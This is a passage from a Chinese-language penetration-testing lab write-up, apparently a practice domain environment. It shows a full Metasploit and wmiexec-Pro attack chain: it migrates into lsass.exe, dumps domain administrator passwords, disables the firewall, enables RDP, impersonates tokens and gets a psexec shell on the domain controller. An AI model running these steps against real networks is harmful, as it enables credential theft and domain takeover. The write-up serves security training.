         408   4     smss.exe                      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
         628   536   lsass.exe                     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe 
        ```
        
        迁移到`lsass.exe`
        
        ```python
        meterpreter > migrate 628
        [*] Migrating from 2720 to 628...
        [*] Migration completed successfully.
        ```
        
    - 抓取密码
        
        ```python
        meterpreter > creds_all                        
        kerberos credentials                          
        ====================                                                                                                                                                                    
                                                      
        Username       Domain    Password    
        --------       ------    --------             
        (null)         (null)    (null)
        Administrator  TEST.ORG  zxcASDqw123!!                                                      
        Administrator  WIN2008   123qwe!ASD
        ```
        
        抓取到域的管理员账户密码，密码为 `zxcASDqw123!!`
        

## 获取域控shell

1. 上边抓到了域管理员的密码，我们使用`psexec`连接
    
    ```python
    msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                                                     
    msf6 exploit(windows/smb/psexec) > set SMBUSER administrator  
    msf6 exploit(windows/smb/psexec) > set rhosts 192.168.93.10
    msf6 exploit(windows/smb/psexec) > set SMBPass zxcASDqw123!!
    msf6 exploit(windows/smb/psexec) > set lport 4445
    msf6 exploit(windows/smb/psexec) > run
    
    [*] 192.168.93.10:445 - Connecting to the server...
    [*] 192.168.93.10:445 - Authenticating to 192.168.93.10:445 as user 'administrator'...
    [*] 192.168.93.10:445 - Selecting PowerShell target
    [*] 192.168.93.10:445 - Executing the payload...
    [+] 192.168.93.10:445 - Service start timed out, OK if running a command or non-service executable...
    [*] Started bind TCP handler against 192.168.93.10:4445
    [*] Exploit completed, but no session was created.
    msf6 exploit(windows/smb/psexec) > 
    ```
    
    没连上，挠头
    
2. 换别的工具，新找到的一个工具，发现挺好用的
    
    > https://github.com/XiaoliChan/wmiexec-Pro
    > 
    - 测试是否成功（密码的`!`号前面记得加上斜杠转义）
        
        ```python
        proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\!\!@192.168.93.10 exec-command -command "ipconfig"
        ```
        
        ```python
        [+] Getting command results...
        
        Windows IP Configuration
        
        Ethernet adapter Ethernet0:
        
           Connection-specific DNS Suffix  . : 
           Link-local IPv6 Address . . . . . : fe80::1fa:2f8:97ac:1160%12
           IPv4 Address. . . . . . . . . . . : 192.168.93.10
           Subnet Mask . . . . . . . . . . . : 255.255.255.0
           Default Gateway . . . . . . . . . : 
        
        Tunnel adapter isatap.{22AC77BB-4205-4120-89CB-C8F5240403E0}:
        
           Media State . . . . . . . . . . . : Media disconnected
           Connection-specific DNS Suffix  . : 
        ```
        
        成功获取到域控IP
        
    - 我们将其防火墙关闭
        
        ```python
        proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\!\!@192.168.93.10 firewall -firewall-profile disable
        [+] All firewall profile has been disable.
        ```
        
    - 开启3389端口（RDP）服务
        
        ```python
        proxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\!\!@192.168.93.10 rdp -enable
        [+] Enabling RDP services and setting up firewall.
        [+] RDP port: 3389
        [+] RDP enabled!
        ```
        
3. 窃取管理员`token`令牌
    
    ```python
    # meterpreter > use incognito
    
    # meterpreter > list_tokens -u  
    Delegation Tokens Available
    ========================================
    NT AUTHORITY\LOCAL SERVICE
    NT AUTHORITY\NETWORK SERVICE
    NT AUTHORITY\SYSTEM
    TEST\administrator
    WIN2008\Administrator
    
    # meterpreter > impersonate_token "TEST\administrator"
    [+] Delegation token available
    [+] Successfully impersonated user TEST\administrator
    ```
    
4. 尝试连接远程桌面
    
    ```python
    proxychains rdesktop 192.168.93.10 -p zxcASDqw123\!\! -u administrator -v     
    [proxychains] config file found: /etc/proxychains4.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    is_wm_active(): WM name: Xfwm
    Connecting to server using NLA...
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.93.10:3389  ...  OK
    Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
    TLS  Session info: (TLS1.2)-(DHE-CUSTOM1024)-(RSA-SHA1)-(AES-256-GCM)
    
    Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
    Failed to connect using NLA, trying with SSL
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.93.10:3389  ...  OK
    Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).
    ```
    
    失败
    
5. 再尝试`Psexec`
    
    ```python
    msf6 auxiliary(server/socks_proxy) > use exploit/windows/smb/psexec                                                     
    msf6 exploit(windows/smb/psexec) > set SMBUSER administrator  
    msf6 exploit(windows/smb/psexec) > set rhosts 192.168.93.10
    msf6 exploit(windows/smb/psexec) > set SMBPass zxcASDqw123!!
    msf6 exploit(windows/smb/psexec) > set lport 4445
    msf6 exploit(windows/smb/psexec) > run
    [*] 192.168.93.10:445 - Connecting to the server...
    [*] 192.168.93.10:445 - Authenticating to 192.168.93.10:445 as user 'administrator'...
    [*] 192.168.93.10:445 - Selecting PowerShell target
    [*] 192.168.93.10:445 - Executing the payload...
    [+] 192.168.93.10:445 - Service start timed out, OK if running a command or non-service executable...
    [*] Started bind TCP handler against 192.168.93.10:4445
    [*] Sending stage (176198 bytes) to 192.168.93.10
    [*] Meterpreter session 4 opened (192.168.93.100:51849 -> 192.168.93.10:4445 via session 2) at 2024-11-28 15:58:06 +0800
    meterpreter > 
    ```
    
    成功了，拿到了域控的`shell` ！！
    
6. 最后发现可以先远程到win2008然后再远程到域控
    
    ![image.png](image48.png)
    

## 读取Flag文件

```python
C:\Users\Administrator\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is D6DC-065A

 Directory of C:\Users\Administrator\Documents

10/31/2019  12:52 AM    <DIR>          .
10/31/2019  12:52 AM    <DIR>          ..
10/31/2019  12:53 AM                13 flag.txt
               1 File(s)             13 bytes
               2 Dir(s)  50,368,212,992 bytes free

C:\Users\Administrator\Documents>type flag.txt
type flag.txt
this is flag!
```

![image.png](image49.png)

## 总结

ew代理使用，更熟悉MSF框架，以及域内有linux和windows两种系统渗透，其实除了爆破还有NTLM中继的思路，但是还没有实现，接着就去实现NTLM中继